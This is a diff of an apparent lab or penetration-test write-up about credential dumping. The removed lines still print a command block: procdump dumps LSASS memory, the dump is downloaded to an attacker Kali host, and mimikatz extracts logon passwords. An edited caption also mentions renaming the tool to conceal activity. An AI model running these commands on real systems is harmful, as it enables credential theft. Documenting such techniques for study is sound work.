@@ -91,17 +91,9 @@ The Sysinternals Procdump tool is retrieved by the attacker and discreetly uploa
   <img src="images/systemproof.png">
 </p>
 <p align="center">
-  <em>Figure 4.3: Procdump retrieved and staged from the attacker environment and uploaded to the victim host afterward</em>
+  <em>Figure 4.3: Procdump retrieved and staged from the attacker environment and uploaded to the victim host afterward(pdf46.exe) to conceal the activity</em>
 </p>
 
-**Command**
-```bash
-C:\Windows\Temp\procdump64.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp /accepteula
-download C:\Windows\Temp\lsass.dmp /home/kali/lsass.dmp
-wine mimikatz.exe
-sekurlsa::minidump /home/kali/lsass.dmp
-sekurlsa::logonpasswords
-```
 
 <p align="center">
   <img src="images/procdump.png">
